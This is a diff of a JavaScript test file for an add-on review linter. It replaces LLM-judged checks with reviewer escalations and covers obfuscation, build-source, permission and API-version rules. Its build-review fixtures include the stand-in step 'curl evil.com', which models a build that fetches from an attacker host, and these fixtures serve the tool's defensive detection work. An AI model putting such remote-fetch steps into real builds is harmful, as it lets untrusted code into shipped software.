@@ -48,7 +48,6 @@ import disguisedTransmission from "../../src/checks/rules/disguised-transmission
 import unparsableFile from "../../src/checks/rules/unparsable-file.js";
 import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
 import undeclaredBuildSource from "../../src/checks/rules/undeclared-build-source.js";
-import buildNotFromSource from "../../src/checks/rules/build-not-from-source.js";
 import unsupportedBuildTool from "../../src/checks/rules/unsupported-build-tool.js";
 import buildRegistryRedirect from "../../src/checks/rules/build-registry-redirect.js";
 import committedNodeModules from "../../src/checks/rules/committed-node-modules.js";
@@ -60,7 +59,6 @@ import defaultLocaleUnused from "../../src/checks/rules/default-locale-unused.js
 import addonIconMissing from "../../src/checks/rules/addon-icon-missing.js";
 import unrecognizedManifestKey from "../../src/checks/rules/unrecognized-manifest-key.js";
 import backgroundModule from "../../src/checks/rules/background-module.js";
-import unusedPermissionRecheck from "../../src/checks/rules/unused-permission-recheck.js";
 import unusedPermissionProducer from "../../src/checks/rules/unused-permission.js";
 import unrecognizedFileType from "../../src/checks/rules/unrecognized-file-type.js";
 import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
@@ -74,7 +72,6 @@ import {
   assertRequiredPhaseSections,
 } from "../../src/checks/registry.js";
 import { finding, SEVERITY } from "../../src/report/finding.js";
-import { runLlmCheck } from "../../src/checks/escalation.js";
 
 // loadChecks groups its result by phase (a check's phase IS the list it lands in).
 // Flatten it when a test cares about the checks themselves, not which phase they run in.
@@ -458,12 +455,8 @@ test("obfuscated-code flags obfuscated JS; minified-only routes elsewhere", () =
 
 // A weak-family-only file (a revealing-module pattern, which the structural
 // detector flags but readable code also has) is the UNSURE verdict: no
-// deterministic finding, one LLM candidate judged from the file's own content.
-// With a token, evaluate's per-candidate verdict drives the check's OWN resolve
-// mapping - fail -> finding, pass -> drop, unsure -> manual review - which the
-// deterministic and no-token paths never exercise. ctx.llm.evaluate is faked
-// (no network); each run returns the given verdict for every candidate.
-test("obfuscated-code maps the LLM verdict of a weak-only candidate: fail->finding, pass->drop, unsure->manual", async () => {
+// deterministic finding, and the file escalates to a reviewer instead.
+test("obfuscated-code escalates a weak-only match instead of flagging it", () => {
   // A revealing-module pattern over the 1024-byte floor: an IIFE-initialized
   // const referenced only as `Helper.method(...)`, which structurally matches
   // the WEAK family the detector applies no density guard to -> UNSURE, not FAIL.
@@ -483,46 +476,11 @@ test("obfuscated-code maps the LLM verdict of a weak-only candidate: fail->findi
   const weak = `const Helper = (() => {\n${methods}  return { ${returns} };\n})();\n${calls}\n`;
 
   const step = obfuscatedCode.run(withManifest(filesCtx({ "app.js": weak })));
-  // No deterministic finding for a weak-only match - just the one candidate.
+  // No deterministic finding for a weak-only match. The one escalation is located
+  // by the file and carries no `{{item}}` token - the reviewer inspects the named
+  // file by hand.
   assert.equal(step.findings.length, 0);
-  assert.equal(step.llm.candidates.length, 1);
-  assert.equal(step.llm.candidates[0].file, "app.js");
-
-  // The check owns the id->file table (perCandidateResolve); the model only ever
-  // returns a verdict keyed to that minted id. Fake evaluate with a token present.
-  const check = {
-    id: "obfuscated-code",
-    title: "Obfuscated code",
-    prompt: "P",
-  };
-  const drive = async (verdict) => {
-    const ctx = {
-      addon: {},
-      llm: {
-        evaluate: async () =>
-          new Map(
-            step.llm.candidates.map((c) => [c.id, { verdict, reason: null }])
-          ),
-      },
-    };
-    return runLlmCheck(ctx, check, step.llm);
-  };
-
-  const failed = await drive(VERDICT.FAIL);
-  assert.equal(failed.findings.length, 1);
-  assert.equal(failed.findings[0].file, "app.js");
-  assert.equal(failed.manualItems.length, 0);
-
-  const passed = await drive(VERDICT.PASS);
-  assert.equal(passed.findings.length, 0);
-  assert.equal(passed.manualItems.length, 0);
-
-  const unsure = await drive(VERDICT.UNSURE);
-  assert.equal(unsure.findings.length, 0);
-  assert.equal(unsure.manualItems.length, 1);
-  // The manual entry is located by the file (the finding's locus); it carries no
-  // `{{item}}` token - the reviewer inspects the named file by hand.
-  assert.equal(unsure.manualItems[0].file, "app.js");
+  assert.deepEqual(step.escalations, [{ file: "app.js" }]);
 });
 
 // vendor-vulnerable surfaces a vulnerability the OSV audit recorded for a
@@ -771,7 +729,7 @@ test("checks carry the sca mode tag (false=XPI-only, true=SCA-only, undefined=bo
 // target, xpi = the built XPI). A check reads only ctx.addon and the orchestrator
 // hands it the correct one; no ctx field or helper exposes the other artifact, so
 // the guarantee is structural (not a source scan). These tests pin the dangerous
-// set and prove the routing reaches even the LLM adjudication.
+// set and prove the routing reaches the escalation too.
 
 // Every check declares a valid input, and the (rare, dangerous) input:xpi set is
 // pinned to exactly the structure checks. A new or flipped check trips this test
@@ -854,7 +812,6 @@ test("every non-recheck check declares a valid input (rechecks declare none); th
     .sort();
   assert.deepEqual(build, [
     "build-lifecycle-hook",
-    "build-not-from-source",
     "build-registry-redirect",
     "committed-build-artifact",
     "committed-node-modules",
@@ -863,18 +820,18 @@ test("every non-recheck check declares a valid input (rechecks declare none); th
   ]);
 });
 
-// The routing reaches the LLM adjudication too - the seam that finding B slipped
-// through. An `input: xpi` LLM check builds candidates over the XPI, and runOneCheck
-// -> runLlmCheck must hand the model the XPI's files (via the routed ctx.addon), not
+// The routing reaches the escalation too - the seam that finding B slipped
+// through. An `input: xpi` check raises its cases over the XPI, and runOneCheck
+// -> the check must read the XPI's files (via the routed ctx.addon), not
 // a captured review source. unused-files emits a candidate for an ambiguous file (a
 // live dynamic loader names it), so this exercises the real corpus path with a stub
-// llm that records the addon it was given.
-test("an input:xpi LLM check adjudicates over its routed (XPI) addon", async () => {
+// ctx that records the addon it was given.
+test("an input:xpi check escalates over its routed (XPI) addon", async () => {
   const mk = (obj) =>
     new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
   const manifest = { manifest_version: 3, background: { scripts: ["bg.js"] } };
   // bg.js is live and dynamically imports a runtime-built path that names helper.js,
-  // so helper.js is ambiguous and unused-files emits an LLM candidate for it.
+  // so helper.js is ambiguous and unused-files escalates it.
   const xpi = {
     files: mk({
       "manifest.json": JSON.stringify(manifest),
@@ -886,176 +843,72 @@ test("an input:xpi LLM check adjudicates over its routed (XPI) addon", async () 
   const [check] = allChecks(
     await loadChecks(loadRegistry(), { only: ["unused-files"] })
   );
-  let seenAddon;
-  // The orchestrator routes an `input: xpi` check to a ctx whose addon is the XPI.
+  // The orchestrator routes an `input: xpi` check to a ctx whose addon is the XPI,
+  // so the case it raises names a file from THAT addon.
   const ctx = {
     addon: xpi,
     jsSources: parsedSources(xpi, { schema }),
     schema,
     mode: REVIEW_MODE.SCA,
     options: {},
-    llm: {
-      evaluate: async (req) => {
-        seenAddon = req.addon;
-        return new Map(
-          req.candidates.map((c) => [c.id, { verdict: VERDICT.UNSURE }])
-        );
-      },
-    },
   };
-  await runOneCheck(withManifest(ctx), check, "[1/1]");
-  assert.equal(seenAddon, xpi); // the model read the XPI's files, not a source addon
+  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
+  assert.deepEqual(
+    out.manualItems.map((m) => m.file),
+    ["helper.js"]
+  );
 });
 
-// ---- build review: undeclared-build-source + build-not-from-source (SCA deterministic;
-// each reads the setup classification on ctx.addon.buildReview; the one LLM call lives in
-// analyzeBuild, tested in build-analysis.test.js) ----
+// ---- build review: undeclared-build-source (SCA; reads the setup record on
+// ctx.addon.buildReview, produced by analyzeBuild) ----
 
 const buildCtx = (review) => ({
   addon: { files: new Map(), buildReview: review },
 });
 const review = (over) => ({
-  classification: "ok",
+  classification: null,
   reason: "",
   buildInstructions: "",
   unresolved: [],
-  analyzed: true,
+  analyzed: false,
   anchor: "package.json",
   ...over,
 });
 
-// undeclared-build-source (mission 1): "remote-fetch" -> error; the offline/unresolved
-// fallback -> manual escalation; classifications owned elsewhere / clean / none -> nothing.
-test("undeclared-build-source: remote-fetch -> error, offline/unresolved -> manual, else silent", () => {
-  const rf = undeclaredBuildSource.run(
-    buildCtx(
-      review({ classification: "remote-fetch", reason: "curls evil.com" })
-    )
+// Nothing classifies what a build does, so every build that HAS a corpus escalates for
+// the reviewer to reproduce - carrying how the source says to build it and whatever
+// steps the linter could not follow. A build with no corpus ("none") says nothing.
+test("undeclared-build-source escalates a build, and stays silent without one", () => {
+  const out = undeclaredBuildSource.run(
+    buildCtx(review({ buildInstructions: "npm ci && npm run build" }))
   );
-  assert.equal(rf.findings.length, 1);
-  assert.equal(rf.findings[0].file, "package.json");
-  assert.equal(rf.findings[0].data.explanation, "curls evil.com");
-  assert.ok(!rf.escalations?.length);
-
-  // offline (analyzed:false, classification null) -> one manual escalation, no finding.
-  const off = undeclaredBuildSource.run(
-    buildCtx(
-      review({
-        classification: null,
-        analyzed: false,
-        buildInstructions: "npm ci && npm run build",
-      })
-    )
-  );
-  assert.equal(off.findings.length, 0);
-  assert.equal(off.escalations.length, 1);
+  assert.equal(out.findings.length, 0);
+  assert.equal(out.escalations.length, 1);
+  assert.equal(out.escalations[0].file, "package.json");
+  // The reviewer must reproduce it themselves, so this is not a code-review question.
+  assert.equal(out.escalations[0].manualReview, true);
   assert.equal(
-    off.escalations[0].data.buildInstructions,
+    out.escalations[0].data.buildInstructions,
     "npm ci && npm run build"
   );
 
-  // analyzed ok BUT a step the linter could not bound -> still manual.
-  const unr = undeclaredBuildSource.run(
-    buildCtx(review({ unresolved: [{ kind: "tool", detail: "make" }] }))
-  );
-  assert.equal(unr.escalations.length, 1);
-  assert.match(unr.escalations[0].data.unresolvedBuildSteps, /make/);
-
-  // clean ok, nothing unresolved -> nothing.
-  assert.deepEqual(undeclaredBuildSource.run(buildCtx(review())), {
-    findings: [],
-  });
-  // owned by the other check / no build / no buildReview -> nothing.
-  for (const c of ["not-from-source", "none"]) {
-    assert.deepEqual(
-      undeclaredBuildSource.run(
-        buildCtx(review({ classification: c, analyzed: c !== "none" }))
-      ),
-      { findings: [] }
-    );
-  }
-  assert.deepEqual(undeclaredBuildSource.run({ addon: { files: new Map() } }), {
-    findings: [],
-  });
-});
-
-// build-not-from-source (mission 2): fires ONLY on "not-from-source".
-test("build-not-from-source fires only on the not-from-source classification", () => {
-  const hit = buildNotFromSource.run(
+  // A step the linter could not statically bound is named in the entry.
+  const unresolved = undeclaredBuildSource.run(
     buildCtx(
-      review({ classification: "not-from-source", reason: "just zips dist/" })
+      review({ unresolved: [{ kind: "network", detail: "curl evil.com" }] })
     )
   );
-  assert.equal(hit.length, 1);
-  assert.equal(hit[0].data.explanation, "just zips dist/");
-  for (const c of ["ok", "remote-fetch", "none", null]) {
-    assert.deepEqual(
-      buildNotFromSource.run(buildCtx(review({ classification: c }))),
-      []
-    );
-  }
-});
-
-// The SCA summary split partitions the recheck CONSUMERS by their producer's corpus:
-// input:source producers read the source, input:xpi producers read the built XPI. Each
-// consumer bridges only to the summary of its own corpus.
-test("recheckConsumersByCorpus partitions consumers by their producer's input", () => {
-  const { source, xpi } = loadRegistry().recheckConsumersByCorpus();
-  // source-anchored (producer input: source)
-  assert.ok(source.has("data-exfiltration-recheck"));
-  assert.ok(source.has("disguised-transmission-recheck"));
-  // XPI-anchored (producer input: xpi) - unused-permission judges the shipped bytes
-  assert.ok(xpi.has("unused-permission-recheck"));
-  assert.ok(xpi.has("unused-files-recheck"));
-  assert.ok(xpi.has("minimize-web-accessible-resources-recheck"));
-  assert.ok(xpi.has("missing-english-localization-recheck"));
-  // disjoint
-  assert.equal([...source].filter((c) => xpi.has(c)).length, 0);
-});
-
-// In SCA the summary runs once per corpus, so a source-anchored recheck (data-exfiltration,
-// input: source) bridges to the source summary: its unsure sites divert to the recheck bucket
-// like any other producer, rather than routing straight to manual review.
-test("SCA diverts a source-anchored recheck to the summary", async () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  const manifest = { manifest_version: 3, background: { scripts: ["bg.js"] } };
-  // A remote fetch carrying a body -> data-exfiltration escalates it (ambiguous consent).
-  const addon = {
-    files: mk({
-      "manifest.json": JSON.stringify(manifest),
-      "bg.js": `const data = "x";\nfetch("https://api.example.com/", { body: data });`,
-    }),
-    manifest,
-  };
-  const ctx = withManifest({
-    addon,
-    jsSources: parsedSources(addon, { schema }),
-    schema,
-    mode: REVIEW_MODE.SCA,
-    options: {},
-    // The per-site adjudication returns unsure, so the site becomes a manual item the
-    // divert then routes.
-    llm: {
-      evaluate: async (req) =>
-        new Map(req.candidates.map((c) => [c.id, { verdict: VERDICT.UNSURE }])),
-      // runChecks now also runs the add-on summary; benign stubs keep it from erroring
-      // (the divert this test asserts on happens in the main loop, before the summary).
-      reviewAddon: async () => ({ summary: "", recheck: [] }),
-      summarize: async () => "",
-    },
-  });
-  const out = await runChecks(
-    loadRegistry(),
-    { only: ["data-exfiltration"], recheckActive: true },
-    siblingsOf(ctx)
+  assert.match(
+    unresolved.escalations[0].data.unresolvedBuildSteps,
+    /curl evil\.com/
   );
-  // Diverted to the summary (source corpus), not left in manual review.
-  assert.ok(
-    ctx.recheck?.get("data-exfiltration-recheck")?.length,
-    "the exfiltration site is handed to the recheck consumer in SCA"
+
+  // No build corpus at all -> nothing to reproduce, nothing said.
+  const none = undeclaredBuildSource.run(
+    buildCtx(review({ classification: "none" }))
   );
-  assert.ok(!out.manualItems.some((m) => m.file === "bg.js"));
+  assert.equal(none.findings.length, 0);
+  assert.deepEqual(none.escalations ?? [], []);
 });
 
 // ---- unsupported-build-tool (SCA deterministic: npm/pnpm only) ----
@@ -1285,40 +1138,38 @@ test("unused-permission lists the unprovable declared named permissions", () => 
   assert.ok(out.escalations.every((e) => e.file === "manifest.json"));
 });
 
-// The producer's deterministic verdict: a permission whose linked prompt entries
-// (check.recheck.permissionPrompts) declare usage tokens that appear nowhere in
-// the LIVE code (comments excluded) or manifest is unused - a finding, never an
+// The deterministic verdict: a permission whose linked prompt entries
+// (check.permissionTokens) declare usage tokens that appear nowhere in the LIVE
+// code (comments excluded) or manifest is unused - a finding, never an
 // escalation. Everything the tokens cannot decide keeps escalating: a found
 // token, an entry without tokens (unlimitedStorage), or no entry at all.
-// Shaped exactly like production LoadedCheck.recheckData (recheckDataFor):
-// token entries only, no consumer entry or prose.
-const PERMISSION_TOKEN_RECHECK = {
-  permissionPrompts: [
-    {
-      permissions: ["compose"],
-      tokens: [
-        "tabs.executeScript",
-        "tabs.insertCSS",
-        "scripting.executeScript",
-        "scripting.insertCSS",
-      ],
-      minStrictVersion: null,
-      maxStrictVersion: null,
-    },
-    {
-      permissions: ["cookies"],
-      tokens: ["cookieStoreId"],
-      minStrictVersion: null,
-      maxStrictVersion: null,
-    },
-    {
-      permissions: ["unlimitedStorage"],
-      tokens: [],
-      minStrictVersion: null,
-      maxStrictVersion: null,
-    },
-  ],
-};
+// Shaped exactly like production LoadedCheck.permissionTokens
+// (permissionTokensFor): token entries only, no prose.
+const PERMISSION_TOKENS = [
+  {
+    permissions: ["compose"],
+    tokens: [
+      "tabs.executeScript",
+      "tabs.insertCSS",
+      "scripting.executeScript",
+      "scripting.insertCSS",
+    ],
+    minStrictVersion: null,
+    maxStrictVersion: null,
+  },
+  {
+    permissions: ["cookies"],
+    tokens: ["cookieStoreId"],
+    minStrictVersion: null,
+    maxStrictVersion: null,
+  },
+  {
+    permissions: ["unlimitedStorage"],
+    tokens: [],
+    minStrictVersion: null,
+    maxStrictVersion: null,
+  },
+];
 
 test("unused-permission decides token-absent permissions deterministically", () => {
   const manifest = {
@@ -1350,7 +1201,7 @@ test("unused-permission decides token-absent permissions deterministically", () 
     apiUsages: [],
   };
   const out = unusedPermissionProducer.run(withManifest(ctx), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   assert.deepEqual(
     out.findings.map((f) => f.item),
@@ -1399,7 +1250,7 @@ test("unused-permission locates a bare token in a non-authored bundle (raw scan)
     },
   };
   const out = unusedPermissionProducer.run(withManifest(ctx), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   // cookieStoreId located in the non-authored bundle via the raw-line scan, lineOffset
   // applied (source line 2 + offset 5).
@@ -1444,28 +1295,26 @@ test("unused-permission resolves dotted injection tokens via api-usage; bare tok
       ]),
     },
   });
-  const recheckData = {
-    permissionPrompts: [
-      ...["compose", "messagesModify", "activeTab"].map((p) => ({
-        permissions: [p],
-        tokens: [
-          "tabs.executeScript",
-          "tabs.insertCSS",
-          "scripting.executeScript",
-          "scripting.insertCSS",
-        ],
-        minStrictVersion: null,
-        maxStrictVersion: null,
-      })),
-      {
-        permissions: ["cookies"],
-        tokens: ["cookieStoreId"],
-        minStrictVersion: null,
-        maxStrictVersion: null,
-      },
-    ],
-  };
-  const out = unusedPermissionProducer.run(ctx, { recheckData });
+  const permissionTokens = [
+    ...["compose", "messagesModify", "activeTab"].map((p) => ({
+      permissions: [p],
+      tokens: [
+        "tabs.executeScript",
+        "tabs.insertCSS",
+        "scripting.executeScript",
+        "scripting.insertCSS",
+      ],
+      minStrictVersion: null,
+      maxStrictVersion: null,
+    })),
+    {
+      permissions: ["cookies"],
+      tokens: ["cookieStoreId"],
+      minStrictVersion: null,
+      maxStrictVersion: null,
+    },
+  ];
+  const out = unusedPermissionProducer.run(ctx, { permissionTokens });
   const linesOf = (perm) =>
     out.escalations
       .find((e) => e.item === perm)
@@ -1512,7 +1361,7 @@ test("unused-permission grounds compose from the compose_scripts manifest key", 
     apiUsages: [],
   };
   const out = unusedPermissionProducer.run(withManifest(ctx), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   assert.equal(out.findings.length, 0);
   assert.deepEqual(out.escalations, []);
@@ -1574,7 +1423,7 @@ test("unused-permission escalates instead of deciding when the scan is blind", (
   });
   // Decidable baseline: tokens absent -> finding.
   const decided = unusedPermissionProducer.run(withManifest(base()), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   assert.equal(decided.findings.length, 1);
   // A dynamic member tail (browser.tabs[m]) -> blind -> escalate.
@@ -1587,7 +1436,7 @@ test("unused-permission escalates instead of deciding when the scan is blind", (
     },
   ];
   const dyn = unusedPermissionProducer.run(withManifest(dynamic), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   assert.equal(dyn.findings.length, 0);
   assert.deepEqual(
@@ -1605,7 +1454,7 @@ test("unused-permission escalates instead of deciding when the scan is blind", (
   ];
   assert.equal(
     unusedPermissionProducer.run(withManifest(limited), {
-      recheckData: PERMISSION_TOKEN_RECHECK,
+      permissionTokens: PERMISSION_TOKENS,
     }).findings.length,
     0
   );
@@ -1624,7 +1473,7 @@ test("unused-permission escalates instead of deciding when the scan is blind", (
     nonAuthored: new Set(["bg.js"]),
   };
   const obf = unusedPermissionProducer.run(withManifest(obfuscated), {
-    recheckData: PERMISSION_TOKEN_RECHECK,
+    permissionTokens: PERMISSION_TOKENS,
   });
   assert.equal(obf.findings.length, 0); // no deterministic finding
   assert.deepEqual(
@@ -1637,7 +1486,7 @@ test("unused-permission escalates instead of deciding when the scan is blind", (
   sca.mode = REVIEW_MODE.SCA;
   assert.equal(
     unusedPermissionProducer.run(withManifest(sca), {
-      recheckData: PERMISSION_TOKEN_RECHECK,
+      permissionTokens: PERMISSION_TOKENS,
     }).findings.length,
     1
   );
@@ -1663,20 +1512,20 @@ test("unused-permission: a version-excluded token-less entry does not poison", (
     },
     apiUsages: [],
   };
-  const recheckData = {
-    permissionPrompts: [
-      ...PERMISSION_TOKEN_RECHECK.permissionPrompts,
-      // Applies only from 154 on - out of bounds for this add-on, so its
-      // token-lessness is irrelevant and compose stays decidable.
-      {
-        permissions: ["compose"],
-        tokens: [],
-        minStrictVersion: "154",
-        maxStrictVersion: null,
-      },
-    ],
-  };
-  const out = unusedPermissionProducer.run(withManifest(ctx), { recheckData });
+  const permissionTokens = [
+    ...PERMISSION_TOKENS,
+    // Applies only from 154 on - out of bounds for this add-on, so its
+    // token-lessness is irrelevant and compose stays decidable.
+    {
+      permissions: ["compose"],
+      tokens: [],
+      minStrictVersion: "154",
+      maxStrictVersion: null,
+    },
+  ];
+  const out = unusedPermissionProducer.run(withManifest(ctx), {
+    permissionTokens,
+  });
   assert.deepEqual(
     out.findings.map((f) => f.item),
     ["compose"]
@@ -1695,19 +1544,17 @@ test("unused-permission: a token-less entry poisons its permissions", () => {
     },
     apiUsages: [],
   };
-  const recheck = {
-    permissionPrompts: [
-      ...PERMISSION_TOKEN_RECHECK.permissionPrompts,
-      {
-        permissions: ["compose"],
-        tokens: [],
-        minStrictVersion: null,
-        maxStrictVersion: null,
-      },
-    ],
-  };
+  const permissionTokens = [
+    ...PERMISSION_TOKENS,
+    {
+      permissions: ["compose"],
+      tokens: [],
+      minStrictVersion: null,
+      maxStrictVersion: null,
+    },
+  ];
   const out = unusedPermissionProducer.run(withManifest(ctx), {
-    recheckData: recheck,
+    permissionTokens,
   });
   assert.equal(out.findings.length, 0);
   assert.deepEqual(
@@ -1720,16 +1567,14 @@ test("unused-permission: a token-less entry poisons its permissions", () => {
 // whose bounds exclude the add-on's strict_min_version contributes no tokens,
 // so the permission stays undecidable and escalates.
 test("unused-permission selects token lists by strict_min_version", () => {
-  const recheck = {
-    permissionPrompts: [
-      {
-        permissions: ["compose"],
-        tokens: ["executeScript"],
-        minStrictVersion: "154",
-        maxStrictVersion: null,
-      },
-    ],
-  };
+  const permissionTokens = [
+    {
+      permissions: ["compose"],
+      tokens: ["executeScript"],
+      minStrictVersion: "154",
+      maxStrictVersion: null,
+    },
+  ];
   const run = (strictMin) => {
     const manifest = {
       manifest_version: 2,
@@ -1747,7 +1592,7 @@ test("unused-permission selects token lists by strict_min_version", () => {
       apiUsages: [],
     };
     return unusedPermissionProducer.run(withManifest(ctx), {
-      recheckData: recheck,
+      permissionTokens,
     });
   };
   // In bounds: the tokens apply, executeScript is absent -> deterministic.
@@ -1847,7 +1692,7 @@ test("unused-permission credits function-level permissions (archive/delete)", ()
 
 // A permission that gates no callable API (unlimitedStorage) can never be proved
 // used by static analysis. It is no longer hand-exempt: it escalates like any other
-// not-provably-used permission, to be re-judged by the LLM recheck (the registry
+// not-provably-used permission, escalated for a reviewer to settle (the registry
 // grounds it on whether the add-on persists data) or reviewed by hand.
 test("unused-permission escalates unlimitedStorage (gates no API)", () => {
   const manifest = {
@@ -1877,87 +1722,6 @@ test("unused-permission escalates unlimitedStorage (gates no API)", () => {
     {
       item: "unlimitedStorage",
       verdict: VERDICT.UNSURE,
-    }
-  );
-});
-
-// ---- unused-permission-recheck (recheck consumer) ----
-// Given the items handed to it (ctx.recheck) and the summary's verdicts
-// (ctx.addon.recheck), it aggregates per permission: fail -> a warning finding on the
-// permission's manifest line, pass -> dropped, unsure -> a manual-review escalation.
-// The finding/manual are deliberately reason-free (the model's reasons live only in
-// the AI summary). These items carry no located sites, so each is judged holistically
-// (keyed by the permission itself). The aggregation is resolvePermissionRecheck (see
-// recheck.test.js); this confirms the module is wired to it.
-test("unused-permission-recheck maps the summary's recheck verdicts to findings + escalations", () => {
-  const check = { id: "unused-permission-recheck" };
-  const ctx = {
-    recheck: new Map([
-      [
-        "unused-permission-recheck",
-        [
-          {
-            ruleId: "unused-permission",
-            item: "tabs",
-            file: "manifest.json",
-            loc: { line: 4 },
-          },
-          {
-            ruleId: "unused-permission",
-            item: "downloads",
-            file: "manifest.json",
-            loc: { line: 5 },
-          },
-          {
-            ruleId: "unused-permission",
-            item: "storage",
-            file: "manifest.json",
-            loc: { line: 6 },
-          },
-        ],
-      ],
-    ]),
-    addon: {
-      recheck: [
-        {
-          check: "unused-permission-recheck",
-          item: "tabs",
-          verdict: VERDICT.FAIL,
-          reason: "no tab property read",
-        },
-        {
-          check: "unused-permission-recheck",
-          item: "downloads",
-          verdict: VERDICT.UNSURE,
-          reason: "cannot tell",
-        },
-        {
-          check: "unused-permission-recheck",
-          item: "storage",
-          verdict: VERDICT.PASS,
-          reason: "used by storage.local",
-        },
-      ],
-    },
-  };
-  const out = unusedPermissionRecheck.run(withManifest(ctx), check);
-  assert.equal(out.findings.length, 1);
-  assert.equal(out.findings[0].item, "tabs"); // fail -> finding
-  assert.equal(out.findings[0].loc.line, 4); // the permission's manifest line
-  assert.deepEqual(
-    out.escalations.map((e) => e.item),
-    ["downloads"] // unsure -> manual; storage (pass) is dropped
-  );
-});
-
-test("unused-permission-recheck is a no-op with nothing handed over", () => {
-  assert.deepEqual(
-    unusedPermissionRecheck.run(withManifest({}), {
-      id: "unused-permission-recheck",
-    }),
-    {
-      findings: [],
-      escalations: [],
     }
   );
 });
@@ -2194,7 +1958,7 @@ test("a guard clause defers a too-new API to judgement, not rejection", () => {
   const { usages } = parseApiUsage(src);
   const out = strictMinVersionApi.run(withManifest(minCtx("60.0", usages)));
   assert.deepEqual(out.findings, []); // not a rejection
-  assert.equal(out.llm.candidates.length, 1); // a judgement instead
+  assert.equal(out.escalations.length, 1); // a judgement instead
   // Without the guard clause it stays the hard finding it was.
   const bare = strictMinVersionApi.run(
     withManifest(
@@ -2202,7 +1966,7 @@ test("a guard clause defers a too-new API to judgement, not rejection", () => {
     )
   );
   assert.equal(bare.findings.length, 1);
-  assert.equal(bare.llm, undefined);
+  assert.deepEqual(bare.escalations, []);
 });
 
 // End-to-end (the thinbox folders shape): a namespace captured into a local, then a
@@ -2396,7 +2160,7 @@ test("strict-min-version-api flags APIs added after strict_min_version", () => {
     )
   );
   assert.equal(out.findings.length, 2); // 200 and 66 both > 60, both unguarded
-  assert.equal(out.llm, undefined); // nothing guarded -> no LLM candidates
+  assert.deepEqual(out.escalations, []); // nothing guarded -> nothing deferred
   const f = out.findings.find((x) => x.item === "messenger.messages.future()");
   assert.equal(f.hint, "added in Thunderbird 200");
   assert.equal(f.data.min, "60.0");
@@ -2477,8 +2241,8 @@ test("strict-min-version-api compares minor/patch components", () => {
 
 // A too-new API carrying a guard signal (usage.guarded, set by api-usage.js for
 // optional chaining / a feature-detection or version gate) is not a hard error: it
-// becomes one LLM candidate, judged from the call's file. resolve maps the verdict.
-test("strict-min-version-api defers a guarded too-new API to the LLM", () => {
+// escalates, for a reviewer to judge from the call's file.
+test("strict-min-version-api escalates a guarded too-new API", () => {
   const out = strictMinVersionApi.run(
     withManifest(
       minCtx("60.0", [
@@ -2493,28 +2257,21 @@ test("strict-min-version-api defers a guarded too-new API to the LLM", () => {
     )
   );
   assert.equal(out.findings.length, 0); // not a deterministic finding
-  assert.equal(out.llm.candidates.length, 1);
-  const c = out.llm.candidates[0];
-  assert.equal(c.file, "bg.js");
-  assert.deepEqual(c.corpus, ["bg.js"]); // local judgement: just the call's file
-  assert.match(c.note, /messenger\.messages\.future/);
-  // fail -> finding, pass -> drop, unsure (no verdict) -> manual.
-  const fail = out.llm.resolve(new Map([[c.id, { verdict: VERDICT.FAIL }]]));
-  assert.equal(fail.findings.length, 1);
-  assert.equal(fail.findings[0].item, "messenger.messages.future()");
-  assert.equal(fail.findings[0].data.min, "60.0");
-  const pass = out.llm.resolve(new Map([[c.id, { verdict: VERDICT.PASS }]]));
-  assert.equal(pass.findings.length, 0);
-  assert.equal(pass.manual.length, 0);
-  const unsure = out.llm.resolve(new Map()); // no token / no verdict -> manual
-  assert.equal(unsure.manual.length, 1);
+  assert.equal(out.escalations.length, 1);
+  // The escalation carries everything the reviewer needs to judge the guard: the
+  // API, where it is called, when it was added, and the version claimed.
+  const e = out.escalations[0];
+  assert.equal(e.file, "bg.js");
+  assert.equal(e.item, "messenger.messages.future()");
+  assert.equal(e.data.min, "60.0");
+  assert.match(e.hint, /added in Thunderbird/);
 });
 
 // End-to-end: alias-guarded source parses to a GUARDED usage (via api-usage's alias-aware
-// guard detection), which strict-min-version-api routes to the LLM, not a hard finding.
-// RED before the fix: `m.future()` would parse guarded:false -> a deterministic finding.
+// guard detection), which strict-min-version-api escalates rather than making a hard
+// finding. RED before the fix: `m.future()` would parse guarded:false -> a finding.
 // An if-guard (no typeof) is used so it exercises the alias path, not the typeof shortcut.
-test("strict-min-version-api: alias-guarded source becomes a candidate, not a finding", () => {
+test("strict-min-version-api: alias-guarded source escalates, not a finding", () => {
   const src = `const m = browser.messages; if (m.future) m.future();`;
   const { usages } = parseApiUsage(src);
   const out = strictMinVersionApi.run(
@@ -2531,12 +2288,12 @@ test("strict-min-version-api: alias-guarded source becomes a candidate, not a fi
     })
   );
   assert.equal(out.findings.length, 0); // guarded -> not a hard finding
-  assert.equal(out.llm.candidates.length, 1); // deferred to the LLM
-  assert.match(out.llm.candidates[0].note, /messages\.future/);
+  assert.equal(out.escalations.length, 1); // deferred to a reviewer
+  assert.match(out.escalations[0].item, /messages\.future/);
 });
 
 // An API used UNGUARDED anywhere is a hard error, even if another site is guarded:
-// the unguarded site wins and there is no LLM candidate for it.
+// the unguarded site wins and nothing is escalated for it.
 test("strict-min-version-api: an unguarded site wins over a guarded one", () => {
   const out = strictMinVersionApi.run(
     withManifest(
@@ -2557,7 +2314,7 @@ test("strict-min-version-api: an unguarded site wins over a guarded one", () => 
       ])
     )
   );
-  assert.equal(out.llm, undefined); // no candidate - it is a hard finding
+  assert.deepEqual(out.escalations, []); // nothing deferred - it is a hard finding
   assert.equal(out.findings.length, 1);
   assert.deepEqual(out.findings[0].loc, { line: 9, column: 0 });
 });
@@ -2578,7 +2335,7 @@ test("a guarded non-existent namespace: strict-min ignores it, unknown-api still
   ];
   const out = strictMinVersionApi.run(withManifest(minCtx("60.0", usages)));
   assert.equal(out.findings.length, 0);
-  assert.equal(out.llm, undefined); // never a candidate
+  assert.deepEqual(out.escalations, []); // never deferred
 
   const flagged = unknownApi.run(
     withManifest({
